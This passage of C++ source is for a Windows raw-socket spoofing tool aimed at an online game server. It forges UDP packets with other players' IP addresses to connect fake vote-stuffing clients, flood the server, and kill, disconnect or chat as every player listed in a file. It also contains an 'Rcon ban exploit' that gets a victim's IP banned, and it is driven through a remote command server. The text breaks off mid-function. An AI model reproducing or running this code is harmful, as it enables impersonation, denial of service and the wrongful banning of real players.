/* Paszczak wrote this v2.0 */

// spoofer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <string>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#include "conio.h"
#include <ctime>

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "spoofer.h"

#include "api.h"

typedef long long int64;
static bool RegisterSpam = false;
static bool FloodActive = false;
static char RegisterAddr[128];
static int RegisterPort = 0;
static int RegisterNum = 0;
static char FloodMsg[256];

void SendData(const char *pData, int Size)
{
	m_PayloadSize = Size;

	ZeroMemory(m_aMessage, MAX_MESSAGE);

	for (unsigned int i = 0; i < m_PayloadSize; i++)
		m_aMessage[i] = pData[i];

	IP_HDR IP;
	IP.Version = 4;
	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
	IP.DSCP = 0;
	IP.ECN = 1;
	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
	IP.ID = 0;
	IP.Flags = 0;
	IP.FragOffset = 0;
	IP.TTL = 128;
	IP.Protocol = IPPROTO_UDP;
	IP.Checksum = 0;
	IP.SourceIP = m_FromIP;
	IP.DestIP = m_ToIP;
	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));

	UDP_HDR UDP;
	UDP.SourcePort = m_FromPort;
	UDP.DestPort = m_ToPort;
	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
	UDP.Checksum = 0;

	char *ptr = NULL;

	m_ChecksumUDP = 0;
	ptr = m_aPacket;
	ZeroMemory(m_aPacket, MAX_PACKET);

	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
	ptr += sizeof(IP.SourceIP);
	m_ChecksumUDP += sizeof(IP.SourceIP);

	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
	ptr += sizeof(IP.DestIP);
	m_ChecksumUDP += sizeof(IP.DestIP);

	ptr++;
	m_ChecksumUDP++;

	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
	ptr += sizeof(IP.Protocol);
	m_ChecksumUDP += sizeof(IP.Protocol);

	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
	ptr += sizeof(UDP.Length);
	m_ChecksumUDP += sizeof(UDP.Length);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);
	m_ChecksumUDP += sizeof(UDP);

	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
		*ptr = m_aMessage[i];
	m_ChecksumUDP += m_PayloadSize;

	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);

	ZeroMemory(m_aPacket, MAX_PACKET);
	ptr = m_aPacket;

	memcpy(ptr, &IP, sizeof(IP));
	ptr += sizeof(IP);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);

	memcpy(ptr, m_aMessage, m_PayloadSize);

	m_Sin.sin_family = AF_INET;
	m_Sin.sin_port = m_ToPort;
	m_Sin.sin_addr.s_addr = m_ToIP;

	sendto(m_Sock, m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));

	/*if(Bytes != SOCKET_ERROR)
	std::cout << Bytes << " sent" << std::endl; */
}

void SendData(const char *pData, int Size, int s)
{
	m_PayloadSize = Size;

	ZeroMemory(m_aMessage, MAX_MESSAGE);

	for (unsigned int i = 0; i < m_PayloadSize; i++)
		m_aMessage[i] = pData[i];

	IP_HDR IP;
	IP.Version = 4;
	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
	IP.DSCP = 0;
	IP.ECN = 1;
	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
	IP.ID = 0;
	IP.Flags = 0;
	IP.FragOffset = 0;
	IP.TTL = 128;
	IP.Protocol = IPPROTO_UDP;
	IP.Checksum = 0;
	IP.SourceIP = m_FromIPDummies[s];
	IP.DestIP = m_ToIP;
	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));

	UDP_HDR UDP;
	UDP.SourcePort = 1337;
	UDP.DestPort = m_ToPort;
	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
	UDP.Checksum = 0;

	char *ptr = NULL;

	m_ChecksumUDP = 0;
	ptr = m_aPacket;
	ZeroMemory(m_aPacket, MAX_PACKET);

	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
	ptr += sizeof(IP.SourceIP);
	m_ChecksumUDP += sizeof(IP.SourceIP);

	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
	ptr += sizeof(IP.DestIP);
	m_ChecksumUDP += sizeof(IP.DestIP);

	ptr++;
	m_ChecksumUDP++;

	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
	ptr += sizeof(IP.Protocol);
	m_ChecksumUDP += sizeof(IP.Protocol);

	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
	ptr += sizeof(UDP.Length);
	m_ChecksumUDP += sizeof(UDP.Length);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);
	m_ChecksumUDP += sizeof(UDP);

	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
		*ptr = m_aMessage[i];
	m_ChecksumUDP += m_PayloadSize;

	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);

	ZeroMemory(m_aPacket, MAX_PACKET);
	ptr = m_aPacket;

	memcpy(ptr, &IP, sizeof(IP));
	ptr += sizeof(IP);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);

	memcpy(ptr, m_aMessage, m_PayloadSize);

	m_Sin.sin_family = AF_INET;
	m_Sin.sin_port = m_ToPort;
	m_Sin.sin_addr.s_addr = m_ToIP;

	sendto(m_SockDummies[s], m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));

	/*if(Bytes != SOCKET_ERROR)
	std::cout << Bytes << " sent" << std::endl; */
}

bool Create(SOCKET *pSock)
{
	WSADATA data;
	char aBuf[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data))
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSAStartup() failed: %d\n", GetLastError());
		Output(aBuf);
		return false;
	}

	*pSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0, 0);

	if (*pSock == INVALID_SOCKET)
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSASocket() failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	BOOL optvalue = TRUE;

	if (setsockopt(*pSock, IPPROTO_IP, IP_HDRINCL, (char *)&optvalue, sizeof(optvalue)) == SOCKET_ERROR)
	{
		sprintf_s(aBuf, sizeof(aBuf), "setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	//sprintf_s(aBuf, sizeof(aBuf), "socket created correctly\n");
	Output(aBuf);

	return true;
}

std::string exec(char* cmd) {
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) return "ERROR";
	char buffer[128];
	std::string result = "";
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL)
			result += buffer;
	}
	_pclose(pipe);
	return result;
}

void Output(char *pBuf)
{
	//FILE *pFile = fopen("Sniffer.txt","a+"); 
	//fprintf(pFile,"%s", pBuf); 
	//fclose(pFile); 
	printf("%s", pBuf);
}

void Close()
{
	closesocket(m_Sock);
	WSACleanup();
}

void Close(int id)
{
	closesocket(m_SockDummies[id]);
	WSACleanup();
	//getchar();
}

void str_append(char *dst, const char *src, int dst_size)
{
	int s = strlen(dst);
	int i = 0;
	while(s < dst_size)
	{
		dst[s] = src[i];
		if(!src[i]) /* check for null termination */
			break;
		s++;
		i++;
	}

	dst[dst_size-1] = 0; /* assure null termination */
}

void str_format(char *buffer, int buffer_size, const char *format, ...)
{
	va_list ap;
	va_start(ap, format);
	_vsnprintf(buffer, buffer_size, format, ap);
	va_end(ap);

	buffer[buffer_size-1] = 0; /* assure null termination */
}

int64 time_get()
{
	static int64 last = 0;
	int64 t;
	QueryPerformanceCounter((PLARGE_INTEGER)&t);
	if(t<last) /* for some reason, QPC can return values in the past */
		return last;
	last = t;
	return t;
}

int64 time_freq()
{
	int64 t;
	QueryPerformanceFrequency((PLARGE_INTEGER)&t);
	return t;
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;

	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);

	return (USHORT)(~cksum);
}

/* Debug for packet's data */
void Debug(unsigned char *buffer, int buffersize)
{
	int i;
	for (i = 0; i < buffersize; i++)
	{
		printf("%02X", buffer[i]);
	}

	printf("\n");
}

/* This one *might* generate invalid IPs quite often. */
unsigned long genip()
{
	unsigned char *p_ip;
	unsigned long ul_dst;

	p_ip = (unsigned char*)&ul_dst;
	for (int i = 0; i<sizeof(unsigned long); i++)
		*p_ip++ = rand() % 255;
	return ul_dst;
}

const char *GenIPChar()
{
	int Oktett[4];
	static char aIP[32];
	
	// do the initial random process
	Oktett[0] = rand()%255+1;
	Oktett[1] = rand()%255+1;
	Oktett[2] = rand()%255+1;
	Oktett[3] = rand()%255+1;
	
	// check for invalid IPs
	while(Oktett[0] == 192 || Oktett[0] == 10 || Oktett[0] == 172 || Oktett[0] == 127)
	{
		Oktett[0] = rand()%255+1;
	}
	
	sprintf_s(aIP, sizeof(aIP), "%i.%i.%i.%i", Oktett[0], Oktett[1], Oktett[2], Oktett[3]);

	//printf("%s\n", aIP);
	return aIP;
}

void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
{
	AmountofDummies = Amount; // for tick (keep alive)

	int i;
	for(i = 0; i < Amount; i++)
	{
		if (!Create(&m_SockDummies[i]))
			Close(i);
	}

	// generate IPs
	for (int k = 0; k < Amount; k++)
	{
		m_FromIPDummies[k] = inet_addr(GenIPChar());
	}

	//source port in dummies is const = 1337 ;)

	m_ToIP = inet_addr(IP);
	m_ToPort = htons(Port);
	unsigned char buffer[2048];

	int BufferSize = 0;
	int j = 0;

	// send the dummies
	for(j = 0; j < Amount; j++)
	{
		Reset(j);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackConnect(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackClientInfo(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackReady(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackSendInfo(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackEnterGame(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		// one alive packet right after joining...
		ZeroMemory(buffer, 2048);
		BufferSize = PackKeepAlive(&buffer[0], j);
		SendData((const char*)buffer, BufferSize, j);

		//Debug(&buffer[0], BufferSize);

		// vote if wanted
		if(Vote == 1 || Vote == -1)
		{
			ZeroMemory(buffer, 2048);
			BufferSize = PackVote(&buffer[0], j, Vote);
			SendData((const char*)buffer, BufferSize, j);
		}
	}
}

void DisconnectDummies()
{
	unsigned char buffer[2048];
	int BufferSize = 0;

	int i = 0;

	// send disconnect packets
	for(i = 0; i < AmountofDummies; i++)
	{
		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackDisconnect(&buffer[0], i);
		SendData((const char*)buffer, BufferSize, i);
	}

	AmountofDummies = 0;
}

/*	 ##################### Short summary on this. #######################
 ***
 *** Dummies should not disconnect automatically. The reason for that is,
 *** that if they leave again their vote is not counted.
 *** Just use the dcdummies command instead.
*/
void VoteBot(const char *IP, int Port, int Amount, int v)
{
	// this function is just used as a wrapper for readability
	ConnectDummies(IP, Port, Amount, v);
}

/*	 ########################## Rcon ban exploit. ############################
 ***
 *** We don't need the targets port for this exploit, we just connect a
 *** dummy with the target's ip and spam rcon auth packets. This will get his
 *** whole ip banned. For this procedere we don't need to connect fully, means
 *** if we don't send the READY packet it will still work, but the dummy won't
 *** actually apear ingame.
*/
void RconBan(const char *SrvIP, int Port, const char *BanIP)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(BanIP);

	m_FromPort = htons(1111);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	// send the dummy used to spam the rcon
	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackConnect(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackClientInfo(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackReady(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackSendInfo(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackEnterGame(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	// -> Tick() function
	m_SendRcon = true;
}

void SendConnect(const char *SrvIP, int Port, const char *SpoofIP)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(1337);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackConnect(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackClientInfo(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackReady(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackSendInfo(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackEnterGame(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);
}

void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(SpoofPort);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackDisconnect(&buffer[0], 0);
	SendData((const char*)buffer, BufferSize);
}

void SendStressingNetwork(const char *SrvIP, int Port, const char *SpoofIP)
{
	for(int i = 0; i < 5; i++)
	{
		SendConnect(SrvIP, Port, SpoofIP);
		Sleep(1);
		SendDisconnect(SrvIP, Port, SpoofIP, 1337);
		Sleep(1);
	}
}

void SendKill(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(SpoofPort);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackKill(&buffer[0]);
	SendData((const char*)buffer, BufferSize);
}

void SendRcon(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, const char *pCmd)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(SpoofPort);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackRcon(&buffer[0], pCmd);
	SendData((const char*)buffer, BufferSize);

	char aBuf[256];
	str_format(aBuf, sizeof(aBuf), "Send '%s' through %s:%d to %s:%d", pCmd, SpoofIP, SpoofPort, SrvIP, Port);
	printf(aBuf);
}

void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, const char *Msg)
{
	// ToDo: More than one word as Msg ._. --Note by Meskalin: This should not be done here, but where the command is received.

	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(SpoofPort);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	char aMsg[256];
	sprintf_s(aMsg, sizeof(aMsg), "%s", Msg);

	//printf("Sending '%s' through %s:%d to %s:%d\n", aMsg, SpoofIP, SpoofPort, SrvIP, Port);

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackSay(&buffer[0], aMsg, 0);
	SendData((const char*)buffer, BufferSize);
}

void SendChangeInfo(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, char *name, char *clan, int country, char *skin, int usecustomcolor, int colorbody, int colorfeet)
{
	if (!Create(&m_Sock))
		Close();

	m_FromIP = inet_addr(SpoofIP);
	m_FromPort = htons(SpoofPort);

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	unsigned char buffer[2048];
	int BufferSize = 0;
	Reset();

	ZeroMemory(buffer, sizeof(buffer));
	BufferSize = PackChangeInfo(&buffer[0], name, clan, country, skin, usecustomcolor, colorbody, colorfeet);
	SendData((const char*)buffer, BufferSize);
}

void SpamIPs(const char *IP, int Port)
{
	std::ifstream File("ips.txt");
	if(!File)
	{
		printf("Failed to open ips.txt");
		return;
	}

	if (!Create(&m_Sock))
		Close();

	// loop through the file
	std::string Line;
	while(std::getline(File, Line))
	{
		char aSplit[512][256] = {{0}};
		ZeroMemory(&aSplit, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if(Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}

		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
		{
			m_FromIP = inet_addr(aSplit[0]);
			m_FromPort = htons(atoi(aSplit[1]));

		//	printf(aSplit[0]);

			m_ToIP = inet_addr(IP);
			m_ToPort = htons(Port);

			unsigned char buffer[2048];
			int BufferSize = 0;
			Reset();

			char aMsg[256];
			str_format(aMsg, sizeof(aMsg), "%s", Line.c_str());

			// send the chat packet
			ZeroMemory(buffer, sizeof(buffer));
			BufferSize = PackSay(&buffer[0], aMsg, 0);
			SendData((const char*)buffer, BufferSize);
		}
	}
}

void KillAll(const char *IP, int Port)
{
	std::ifstream File("ips.txt");
	if(!File)
	{
		printf("Failed to open ips.txt");
		return;
	}

	if (!Create(&m_Sock))
		Close();

	// loop through the file
	std::string Line;
	while(std::getline(File, Line))
	{
		char aSplit[512][256] = {{0}};
		ZeroMemory(&aSplit, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if(Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}

		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
		{
			m_FromIP = inet_addr(aSplit[0]);
			m_FromPort = htons(atoi(aSplit[1]));

			m_ToIP = inet_addr(IP);
			m_ToPort = htons(Port);

			unsigned char buffer[2048];
			int BufferSize = 0;
			Reset();

			// send the kill packet
			ZeroMemory(buffer, sizeof(buffer));
			BufferSize = PackKill(&buffer[0]);
			SendData((const char*)buffer, BufferSize);
		}
	}
}

void DCAll(const char *IP, int Port)
{
	std::ifstream File("ips.txt");
	if(!File)
	{
		printf("Failed to open ips.txt");
		return;
	}

	if (!Create(&m_Sock))
		Close();

	// loop through the file
	std::string Line;
	while(std::getline(File, Line))
	{
		char aSplit[512][256] = {{0}};
		ZeroMemory(&aSplit, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if(Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}

		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
		{
			m_FromIP = inet_addr(aSplit[0]);
			m_FromPort = htons(atoi(aSplit[1]));

			m_ToIP = inet_addr(IP);
			m_ToPort = htons(Port);

			unsigned char buffer[2048];
			int BufferSize = 0;
			Reset();

			// send the disconnect packet
			ZeroMemory(buffer, sizeof(buffer));
			BufferSize = PackDisconnect(&buffer[0]);
			SendData((const char*)buffer, BufferSize);
		}
	}
}

void ChatAll(const char *IP, int Port, const char *Msg)
{
	std::ifstream File("ips.txt");
	if(!File)
	{
		printf("Failed to open ips.txt");
		return;
	}

	if (!Create(&m_Sock))
		Close();

	// loop through the file
	std::string Line;
	while(std::getline(File, Line))
	{
		char aSplit[512][256] = {{0}};
		ZeroMemory(&aSplit, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if(Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}

		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
		{
			m_FromIP = inet_addr(aSplit[0]);
			m_FromPort = htons(atoi(aSplit[1]));

			m_ToIP = inet_addr(IP);
			m_ToPort = htons(Port);

			unsigned char buffer[2048];
			int BufferSize = 0;
			Reset();

			char aMsg[256];
			str_format(aMsg, sizeof(aMsg), "%s", Msg);

			// send the chat packet
			ZeroMemory(buffer, sizeof(buffer));
			BufferSize = PackSay(&buffer[0], aMsg, 0);
			SendData((const char*)buffer, BufferSize);
		}
	}
}

void ChatDummy(const char *Msg, int DummyID)
{
	if (AmountofDummies > 0)
	{
		unsigned char buffer[2048];
		int BufferSize = 0;

		char aMsg[256];
		str_format(aMsg, sizeof(aMsg), "%s", Msg);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackSay(&buffer[0], DummyID, aMsg, 0);
		SendData((const char*)buffer, BufferSize, DummyID);
	}
}

void ChatDummies(const char *Msg)
{
	if (AmountofDummies > 0)
	{
		unsigned char buffer[2048];
		int BufferSize = 0;
		
		char aMsg[256];
		str_format(aMsg, sizeof(aMsg), "%s", Msg);

		for (int i = 0; i < AmountofDummies; i++)
		{
			// send the chat packet
			ZeroMemory(buffer, sizeof(buffer));
			BufferSize = PackSay(&buffer[0], i, aMsg, 0);
			SendData((const char*)buffer, BufferSize, i);
		}
	}
}

void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
{
	if (!Create(&m_Sock))
		Close();

	m_ToIP = inet_addr(SrvIP);
	m_ToPort = htons(Port);

	int i;
	for(int i = 1024; i < 65535; i++)
	{
		m_FromIP = inet_addr(SpoofIP);
		m_FromPort = htons(i);

		unsigned char buffer[2048];
		int BufferSize = 0;
		Reset();

		char aMsg[256];
		sprintf_s(aMsg, sizeof(aMsg), "%i", i);

		ZeroMemory(buffer, sizeof(buffer));
		BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
		SendData((const char*)buffer, BufferSize);

		// little delay to reduce traffic
		Sleep(1);
	}
}

void Tick()
{
	if(RegisterSpam)
	{
		static int64 Spammed = 0;
		static bool DidItIt = false;
		int64 Now = time_get();

		if(!DidItIt)
		{
			Sleep(100);

			for (int i = 0; i < AmountofDummies; i++)
			{
				char aMessage[8];
				char aFinalMsg[32];
				int MsgLen = (rand()%3)+4;
				for(int i = 0; i < MsgLen; i++)
					aMessage[i] = 'a'+(rand()%('z'-'a'));
				aMessage[MsgLen] = 0;
				str_format(aFinalMsg, sizeof(aFinalMsg), "/register %s %s", aMessage, aMessage);
					
				ChatDummy(aFinalMsg, i);
			}
			Spammed = Now;
			DidItIt = true;

			Sleep(100);
		}
		else
		{
			DisconnectDummies();
			Spammed = Now;
			DidItIt = false;

			Sleep(100);

			ConnectDummies(RegisterAddr, RegisterPort, RegisterNum, 0);
		}
	}

	if(FloodActive)
	{
		ConnectDummies(RegisterAddr, RegisterPort, RegisterNum, 0);
		Sleep(10);
		if(FloodMsg[0])
		{
			ChatDummies(FloodMsg);
			Sleep(10);
		}
		DisconnectDummies();
		Sleep(10);
	}

	if (m_Tick > 250) // once in 250 ms
	{
		m_Tick = 0;

		//printf("KEEPIN ALIVE ...\n");

		unsigned char buffer[2048];

		int BufferSize = 0;

		// keep the dummies alive
		for (int i = 0; i < AmountofDummies; i++)
		{
			ZeroMemory(buffer, 2048);
			BufferSize = PackKeepAlive(&buffer[0], i);
			SendData((const char*)buffer, BufferSize, i);

			ZeroMemory(buffer, 2048);
			BufferSize = PackEmoticon(&buffer[0], i, 1);
			SendData((const char*)buffer, BufferSize, i);
		}

		if(m_SendRcon)
		{
			// send the rcon auth's
			int i;
			for(i = 0; i < 100; i++)
			{
				ZeroMemory(buffer, 2048);
				BufferSize = PackRconAuth(&buffer[0]);
				SendData((const char*)buffer, BufferSize);
				m_SendRcon = false;
			}
		}
	}
	else
		m_Tick++;
}

void SendIPDetails(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
{
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		printf("Error in WSAStartup(): %s\n", WSAGetLastError());

	SOCKET g_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct hostent *host;
    host = gethostbyname("dev.fruchtihd.de");
    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(80);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if(connect(g_Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
        return;

	char aBuf[512];
	str_format(aBuf, sizeof(aBuf), "GET /ipdetails.php?ip=%s HTTP/1.1\r\nHost: dev.fruchtihd.de\r\nConnection: close\r\n\r\n", SpoofIP);
    send(g_Socket, aBuf, strlen(aBuf), 0);
   
	char buffer[10000];
    memset(&buffer, 0, sizeof(buffer));
	if(recv(g_Socket, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
	{
		char aSplit[512][256] = {{0}};
		ZeroMemory(&aSplit, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the command to extract the parameters
		for(unsigned int i = 0; i < strlen(buffer); i++)
		{
			if(buffer[i] == '#')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = buffer[i];
			Char++;
		}

		SendChat(SrvIP, Port, SpoofIP, SpoofPort, aSplit[1]);
	}

    closesocket(g_Socket);
    WSACleanup();
}

DWORD WINAPI WorkingThread(LPVOID lpParam) 
{
	printf("Created new thread\n");

	SOCKET g_Client = (SOCKET)lpParam; 
	char buffer[256];
	srand((unsigned int)time(0));

	send(g_Client, "[Server]: Connection established! Welcome!", strlen("[Server]: Connection established! Welcome!"), 0);

	while(1)
	{
		memset(&buffer, 0, sizeof(buffer));
		
		if(recv(g_Client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
		{
			char aCmd[512][256] = {{0}};
			ZeroMemory(&aCmd, sizeof(aCmd));
			int Cmd = 0;
			int Char = 0;

			// split the command to extract the parameters
			for(unsigned int i = 0; i < strlen(buffer); i++)
			{
				if(buffer[i] == ' ')
				{
					Cmd++;
					Char = 0;
					continue;
				}

				aCmd[Cmd][Char] = buffer[i];
				Char++;
			}

			if(strcmp(aCmd[0], "status") == 0) // test
			{
				send(g_Client, "[Server]: Working fine", strlen("[Server]: Working fine"), 0);
			}
			else if(strcmp(aCmd[0], "dummies") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					if(Num > 0 && Num <= 64)
					{
						ConnectDummies(aCmd[1], Port, Num, 0);

						send(g_Client, "[Server]: Dummies connected!", strlen("[Server]: Dummies connected!"), 0);
					}
					else
						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: dummies <ip> <port> <num>", strlen("[Server]: Please use: dummies <ip> <port> <num>"), 0);
			}
			else if(strcmp(aCmd[0], "dcdummies") == 0)
			{
				DisconnectDummies();
				send(g_Client, "[Server]: Dummies disconnected.", strlen("[Server]: Dummies disconnected."), 0);
			}
			else if(strcmp(aCmd[0], "votebot") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					int Vote = atoi(aCmd[4]);
					if(Num > 0 && Num <= 64)
					{
						VoteBot(aCmd[1], Port, Num, Vote);

						send(g_Client, "[Server]: Dummies connected! (Voting...)", strlen("[Server]: Dummies connected! (Voting...)"), 0);
					}
					else
						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
				
				}
				else
